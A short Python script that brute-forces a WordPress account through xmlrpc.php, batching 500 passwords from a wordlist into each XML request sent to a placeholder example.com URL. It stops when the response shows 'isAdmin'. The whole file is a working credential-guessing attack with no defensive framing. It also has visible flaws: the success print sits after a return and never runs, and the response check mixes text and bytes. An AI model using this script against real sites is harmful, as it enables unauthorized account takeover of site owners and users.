import random
import requests

with open('payload_base_template.xml', 'r') as f:
    template = f.read()

with open('payload_content_template.xml', 'r') as f:
    content = f.read()


username = 'example'
url = 'http://example.com/xmlrpc.php'


payload_size = 500
contents_l = []
passwords_l = []
headers = {'Content-Type': 'application/xml'}


def main():
    with open('passwords.txt', 'r') as f:
        while True:
            contents_l[:] = []
            passwords_l[:] = []

            print('loading payloads...')
            for password in range(payload_size):
                password = f.readline().strip()
                if password == '':
                    return
                passwords_l.append(password)
                contents_l.append(content.format(username, password))

            contents = ''.join(contents_l)
            payload = template.format(contents)

            print('trying:')
            print(passwords_l)

            r = requests.post(url, data=payload)
            response = r.content
            # print response
            if 'isAdmin' in response:
                return
                print(passwords_l)

main()
